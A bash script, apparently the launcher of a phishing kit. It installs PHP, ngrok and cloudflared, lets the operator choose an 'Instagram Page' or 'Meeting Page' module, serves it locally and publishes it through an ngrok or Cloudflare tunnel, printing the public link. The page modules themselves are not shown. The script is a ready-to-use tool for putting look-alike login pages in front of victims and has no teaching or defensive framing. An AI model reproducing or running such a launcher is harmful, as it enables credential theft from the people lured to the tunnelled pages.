#!/bin/bash

clear

# colors
red="\e[31m"
green="\e[32m"
cyan="\e[36m"
yellow="\e[33m"
reset="\e[0m"

###################################
# dependency checker
###################################

check_command () {

    if ! command -v $1 &> /dev/null
    then
        echo -e "${red}$1 not found! installing...${reset}"

        sudo apt update > /dev/null 2>&1
        sudo apt install $2 -y > /dev/null 2>&1
    else
        echo -e "${green}$1 found${reset}"
    fi

}

###################################
# check required packages
###################################

echo -e "${cyan}Checking dependencies...${reset}"

check_command php php
check_command curl curl
check_command unzip unzip
check_command wget wget

###################################
# check ngrok
###################################

if [ ! -f "./ngrok" ]; then

    echo -e "${yellow}ngrok not found, downloading...${reset}"

    wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
    unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
    rm ngrok-v3-stable-linux-amd64.zip

    chmod +x ngrok

fi


###################################
# check cloudflared
###################################

if ! command -v cloudflared &> /dev/null
then

    echo -e "${yellow}cloudflared not found, installing...${reset}"

    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb > /dev/null 2>&1

    sudo dpkg -i cloudflared-linux-amd64.deb > /dev/null 2>&1

    rm cloudflared-linux-amd64.deb

fi


###################################
# banner
###################################

clear

echo -e "${cyan}"
echo "██████████████████████████████"
echo "        Techyfatcat"
echo "██████████████████████████████"
echo -e "${reset}"

sleep 1


###################################
# module select
###################################

echo -e "${yellow}Select Module:${reset}"

echo "1. Instagram Page"
echo "2. Meeting Page"
echo "3. Exit"

read -p "Enter choice: " module


case $module in

1)
    folder="modules/insta"
    ;;

2)
    folder="modules/meeting"
    ;;

3)
    exit
    ;;

*)
    echo -e "${red}Invalid option${reset}"
    exit
    ;;

esac


###################################
# hosting select
###################################

echo

echo -e "${yellow}Select Hosting Method:${reset}"

echo "1. Localhost"
echo "2. Ngrok"
echo "3. Cloudflare"

read -p "Enter choice: " host


###################################
# start php server
###################################

echo

echo -e "${green}Starting PHP server...${reset}"

php -S 127.0.0.1:8080 -t $folder &

server_pid=$!

sleep 3


###################################
# localhost
###################################

if [ "$host" = "1" ]; then

    echo
    echo -e "${cyan}Local URL:${reset}"
    echo "http://127.0.0.1:8080"


###################################
# ngrok
###################################

elif [ "$host" = "2" ]; then

    echo
    echo -e "${green}Starting Ngrok tunnel...${reset}"

    ./ngrok http 8080 > /dev/null 2>&1 &

    sleep 6

    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')

    echo
    echo -e "${cyan}Ngrok URL:${reset}"
    echo $link


###################################
# cloudflare
###################################

elif [ "$host" = "3" ]; then

    echo
    echo -e "${green}Starting Cloudflare tunnel...${reset}"

    cloudflared tunnel --url http://127.0.0.1:8080 > cf.log 2>&1 &

    sleep 8

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cf.log)

    echo
    echo -e "${cyan}Cloudflare URL:${reset}"
    echo $link


else

    echo -e "${red}Invalid option${reset}"

    kill $server_pid

    exit

fi


###################################
# finish
###################################

echo
echo -e "${yellow}Press CTRL + C to stop server${reset}"

wait